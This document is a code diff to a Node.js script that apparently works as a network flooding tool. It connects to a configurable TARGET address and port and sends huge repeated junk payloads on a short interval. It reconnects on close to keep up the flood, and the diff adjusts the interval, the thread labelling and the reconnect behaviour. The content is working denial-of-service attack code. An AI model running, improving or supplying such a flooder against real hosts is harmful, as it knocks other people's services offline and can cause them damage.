@@ -15,13 +15,13 @@ ERROR. Not enough arguments
 function spam() {
   console.log('Connected');
   let i = 1
-  globalThis.thread = 1
+  // globalThis.thread = 1
   setInterval(() => {
-    process.stdout.write(`[T${globalThis.thread}] #${i} Request\n`)
+    process.stdout.write(`[T1] #${i} Request\n`)
     i++
     let datetime = Date.now().toString(11).repeat(16900)
     client.write(crypto.createHash('sha256', datetime).toString().repeat(5000))
-  }, argv["i"] | 0.001)
+  }, argv["i"] | 1)
 }
 
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
@@ -39,8 +39,7 @@ client.once('ready', () => {
   sleep(5E3)
 })
 
-client.on('error', function(data) {
-  globalThis.thread++
+client.on("close", function(data) {
   client.connect(TARGET.PORT, TARGET.ADDR, spam)
 })
 
@@ -49,3 +48,8 @@ client.on("data", function(d) {
 })
 
 client.setMaxListeners(50)
+
+module.exports = {
+  client,
+  TARGET
+}
